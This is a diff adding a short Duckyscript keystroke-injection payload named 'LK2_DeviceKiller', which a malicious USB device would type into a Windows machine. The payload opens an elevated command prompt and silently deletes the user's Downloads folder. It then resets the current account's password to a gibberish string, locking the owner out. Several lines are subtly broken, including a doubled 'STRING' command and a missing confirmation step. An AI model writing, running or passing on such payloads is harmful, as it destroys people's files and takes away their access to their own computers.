@@ -1,0 +1,26 @@
+REM THIS IS v1 AND UNTESTED
+  GUI R
+  DELAY 500
+  STRING powershell -Command "$ws = New-Object -ComObject Wscript.Shell; $ws.Popup('This is v1 of the software and is untested', 1, 'LK2_DeviceKiller_V1.0.0', 4096)"
+  ENTER
+  DELAY 1200
+  GUI R
+  DELAY 500
+  STRING powershell Start-Process cmd -Verb runAs
+  DELAY 2000
+  STRING del /q /s %userprofile%\Downloads\*
+  ENTER
+  DELAY 1000
+  GUI R
+  DELAY 500
+  STRING STRING powershell -Command "$ws = New-Object -ComObject Wscript.Shell; $ws.Popup('Downloads folder deleted woops', 1, 'LK2_DeviceKiller_V1.0.0', 4096)"
+  ENTER
+  DELAY 1200
+  STRING net user %username% *
+  ENTER
+  DELAY 500
+  STRING LK2fdfhuydfhsdfsdjkf
+  ENTER
+  DELAY 500
+  STRING LK2fdfhuydfhsdfsdjkf
+  ENTER
